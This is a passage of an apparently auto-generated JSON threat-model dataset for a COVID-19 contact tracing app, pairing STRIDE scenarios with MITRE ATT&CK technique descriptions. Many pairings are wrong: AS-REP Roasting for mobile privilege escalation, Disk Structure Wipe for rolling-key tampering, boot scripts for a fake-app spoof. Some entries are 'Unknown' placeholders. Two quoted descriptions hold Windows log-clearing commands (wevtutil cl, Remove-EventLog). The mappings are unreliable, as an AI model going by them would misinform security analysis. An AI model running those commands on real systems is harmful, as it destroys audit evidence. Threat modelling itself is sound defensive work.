                    "Assumption": "The mobile app has privileged functionalities that can be misused.",
                    "Role": "Mobile Application",
                    "Condition": "Occurs if the app does not follow least privilege principles."
                },
                {
                    "Assumption": "Attackers know specific vulnerabilities that allow privilege escalation.",
                    "Role": "Attacker",
                    "Condition": "Valid if such vulnerabilities are published or discovered."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "root access",
                "device control",
                "mobile exploit"
            ],
            "mitre_technique": {
                "name": "AS-REP Roasting",
                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
                "technique_id": "T1558.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker breaches the central server in the centralized architecture and elevates their privileges to gain admin control and manipulate exposure data.",
            "Assumptions": [
                {
                    "Assumption": "The central server's access controls can be bypassed or are misconfigured.",
                    "Role": "Central Server",
                    "Condition": "Occurs if access control policies are weak."
                },
                {
                    "Assumption": "Attackers find a way to exploit server vulnerabilities to gain higher privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if the server has known exploits available."
                }
            ],
            "Potential Impact": "Corruption or tampering of data",
            "MITRE ATT&CK Keywords": [
                "admin access",
                "server breach",
                "privilege escalation",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider with access to the server in a decentralized architecture elevates their privileges to access unauthorized resources and modify rolling keys.",
            "Assumptions": [
                {
                    "Assumption": "Server roles and permissions are not adequately monitored or restricted.",
                    "Role": "Service Server",
                    "Condition": "Occurs if internal access policies are lax."
                },
                {
                    "Assumption": "There are no mechanisms to detect or prevent insider threats.",
                    "Role": "Organization",
                    "Condition": "Valid if employee activities are not monitored."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege escalation",
                "key manipulation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake mobile application that mimics the legitimate contact tracing app to capture user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users rely on visual inspection to verify the authenticity of the application.",
                    "Role": "User",
                    "Condition": "App is easily replicated."
                },
                {
                    "Assumption": "The app store's security measures fail to detect the fake app.",
                    "Role": "App Store Provider",
                    "Condition": "Lack of robust app vetting processes."
                },
                {
                    "Assumption": "Users download and install apps from untrusted sources.",
                    "Role": "User",
                    "Condition": "Lack of user awareness about security risks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "App Store",
                "Credentials"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof Bluetooth signals to generate false proximity data, appearing as if multiple exposures occurred.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth devices do not authenticate their broadcasts.",
                    "Role": "Device Manufacturer",
                    "Condition": "Standard Bluetooth protocols lacking authentication."
                },
                {
                    "Assumption": "The application does not verify the legitimacy of the received Bluetooth data.",
                    "Role": "Application Developer",
                    "Condition": "Lack of verification mechanisms in the app."
                },
                {
                    "Assumption": "Users rely solely on Bluetooth for proximity detection.",
                    "Role": "User",
                    "Condition": "App settings are not adjusted to use GPS."
                }
            ],
            "Potential Impact": "False notifications leading to unnecessary quarantines and panic.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Bluetooth",
                "Proximity"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate server IP address and intercept data being sent to the centralized server.",
            "Assumptions": [
                {
                    "Assumption": "Server IP addresses are not securely transmitted and stored.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of secure communication channels."
                },
                {
                    "Assumption": "Attackers have access to the same network as users.",
                    "Role": "Attacker",
                    "Condition": "Being within the same network range."
                },
                {
                    "Assumption": "The application does not utilize proper server validation methods.",
                    "Role": "Application Developer",
                    "Condition": "Insufficient implementation of server validation."
                }
            ],
            "Potential Impact": "Interception of sensitive information during transmission.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the contact tracing data stored on a user\u2019s device before it is uploaded to the server.",
            "Assumptions": [
                {
                    "Assumption": "Users can access and modify application storage data.",
                    "Role": "User",
                    "Condition": "Rooted or jailbroken devices."
                },
                {
                    "Assumption": "The application does not encrypt data stored locally.",
                    "Role": "Application Developer",
                    "Condition": "Lack of local data encryption."
                },
                {
                    "Assumption": "Attackers have physical access to the device.",
                    "Role": "Attacker",
                    "Condition": "Access gained through theft or loss of the device."
                }
            ],
            "Potential Impact": "Manipulation of data accuracy, leading to incorrect exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data",
                "Local Storage"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware installed on a device could modify the rolling keys used for exposure detection.",
            "Assumptions": [
                {
                    "Assumption": "The user device is compromised by malware.",
                    "Role": "User",
                    "Condition": "Inadvertent download of malicious software."
                },
                {
                    "Assumption": "Rolling keys are stored insecurely on the device.",
                    "Role": "Application Developer",
                    "Condition": "Local encryption not enforced."
                },
                {
                    "Assumption": "Antivirus or anti-malware solutions are not effective.",
                    "Role": "User",
                    "Condition": "Outdated or no security software installed."
                }
            ],
            "Potential Impact": "Disruption in accurate exposure detection.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Malware",
                "Rolling Keys"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with access to the central server could alter the contact history data of users.",
            "Assumptions": [
                {
                    "Assumption": "Attacker obtains administrative privileges on the central server.",
                    "Role": "Attacker",
                    "Condition": "Exploit of a vulnerability or weak credentials."
                },
                {
                    "Assumption": "Server does not log or detect unauthorized data changes.",
                    "Role": "System Administrator",
                    "Condition": "Lack of monitoring and logging mechanisms."
                },
                {
                    "Assumption": "The application assumes server data is always trusted.",
                    "Role": "Application Developer",
                    "Condition": "No data integrity checks from server."
                }
            ],
            "Potential Impact": "Data integrity issues and misinformation about exposure risks.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Server",
                "Contact History"
            ],
            "mitre_technique": {
                "name": "Service Stop",
                "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",
                "id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b",
                "technique_id": "T1489"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received or read exposure notifications, leading to non-compliance with health guidelines.",
            "Assumptions": [
                {
                    "Assumption": "Notifications are delivered through channels without receipt verification.",
                    "Role": "Application Developer",
                    "Condition": "No confirmation mechanisms implemented."
                },
                {
                    "Assumption": "Users can disable notification logging.",
                    "Role": "User",
                    "Condition": "Personal settings allow log modifications."
                },
                {
                    "Assumption": "The system lacks a robust audit trail for sent notifications.",
                    "Role": "System Administrator",
                    "Condition": "Absence of detailed logging."
                }
            ],
            "Potential Impact": "Health and safety risks due to non-compliance.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Notifications",
                "Audit Trail"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies uploading their rolling keys after testing positive for COVID-19.",
            "Assumptions": [
                {
                    "Assumption": "System does not track user submissions.",
                    "Role": "Application Developer",
                    "Condition": "Lack of submission tracking."
                },
                {
                    "Assumption": "There is no authentication to verify positive test results.",
                    "Role": "Health Authority",
                    "Condition": "Absence of health authority verification."
                },
                {
                    "Assumption": "Users have the option to opt-out of data upload.",
                    "Role": "User",
                    "Condition": "Application allows opting out."
                }
            ],
            "Potential Impact": "Incomplete data leading to failure in exposure notification.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Rolling Keys",
                "Data Upload"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A healthcare provider denies notifying users after registering their positive test results in the system.",
            "Assumptions": [
                {
                    "Assumption": "Healthcare provider's actions are not logged.",
                    "Role": "Healthcare Provider",
                    "Condition": "Lack of action logging."
                },
                {
                    "Assumption": "User data submissions are not verified by the system.",
                    "Role": "System Administrator",
                    "Condition": "Absence of verification mechanisms."
                },
                {
                    "Assumption": "There is no acknowledgment mechanism from users.",
                    "Role": "Application Developer",
                    "Condition": "No user feedback loop."
                }
            ],
            "Potential Impact": "Failures in exposure notification processes.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Healthcare Provider",
                "Notification"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive health information could be intercepted during transmission to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over unencrypted channels.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of encryption protocols."
                },
                {
                    "Assumption": "Attackers have access to the same network.",
                    "Role": "Attacker",
                    "Condition": "Same network access as data transmission point."
                },
                {
                    "Assumption": "The application does not employ secure communication mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "No implementation of secure communication protocols."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of personal and health information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Transmission",
                "Sensitive Information"
            ],
            "mitre_technique": {
                "name": "Network Address Translation Traversal",
                "description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
                "id": "attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de",
                "technique_id": "T1599.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Log files containing sensitive data might be accessed and exfiltrated from user devices.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored unencrypted on user devices.",
                    "Role": "Application Developer",
                    "Condition": "Lack of local encryption for log files."
                },
                {
                    "Assumption": "Devices are vulnerable to local access attacks.",
                    "Role": "User",
                    "Condition": "No security measures like PINs or biometric locks."
                },
                {
                    "Assumption": "Malware can access and read log files on the device.",
                    "Role": "Attacker",
                    "Condition": "Device compromise by malware."
                }
            ],
            "Potential Impact": "Disclosure of sensitive usage and personal data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Logs",
                "Exfiltration"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit vulnerabilities in the decentralized architecture to access rolling keys.",
            "Assumptions": [
                {
                    "Assumption": "Rolling keys are not securely stored on user devices.",
                    "Role": "Application Developer",
                    "Condition": "Lack of secure storage mechanisms."
                },
                {
                    "Assumption": "Vulnerabilities within the application can be exploited remotely.",
                    "Role": "Attacker",
                    "Condition": "Use of known exploits."
                },
                {
                    "Assumption": "Rolling keys provide enough information to trace user interactions.",
                    "Role": "Attacker",
                    "Condition": "Keys are not sufficiently masked."
                }
            ],
            "Potential Impact": "Unauthorized access to interaction data and user tracking information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Decentralized Architecture",
                "Rolling Keys"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could overwhelm the centralized server with a flood of false data submissions, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have rate limiting mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Absence of rate limiting controls."
                },
                {
                    "Assumption": "The application does not validate the authenticity of submitted data.",
                    "Role": "Application Developer",
                    "Condition": "Lack of data validation mechanisms."
                },
                {
                    "Assumption": "Network bandwidth can be exhausted by high volume of submissions.",
                    "Role": "Network Administrator",
                    "Condition": "Limited network capacity."
                }
            ],
            "Potential Impact": "Service disruption and inability to process legitimate data.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Flood",
                "Centralized Server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware could disable Bluetooth or GPS functionality on user devices, preventing the app from recording interactions.",
            "Assumptions": [
                {
                    "Assumption": "User devices are susceptible to malware infections.",
                    "Role": "User",
                    "Condition": "Inadvertent malware installation."
                },
                {
                    "Assumption": "The app relies solely on Bluetooth or GPS for tracking.",
                    "Role": "Application Developer",
                    "Condition": "Single dependency on Bluetooth/GPS."
                },
                {
                    "Assumption": "Users do not regularly update security measures on their devices.",
                    "Role": "User",
                    "Condition": "Outdated antivirus and security patches."
                }
            ],
            "Potential Impact": "Loss of app functionality leading to incomplete contact tracing.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Bluetooth",
                "GPS",
                "Disabling Functionality"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could target the service server in the decentralized architecture with a DDoS attack.",
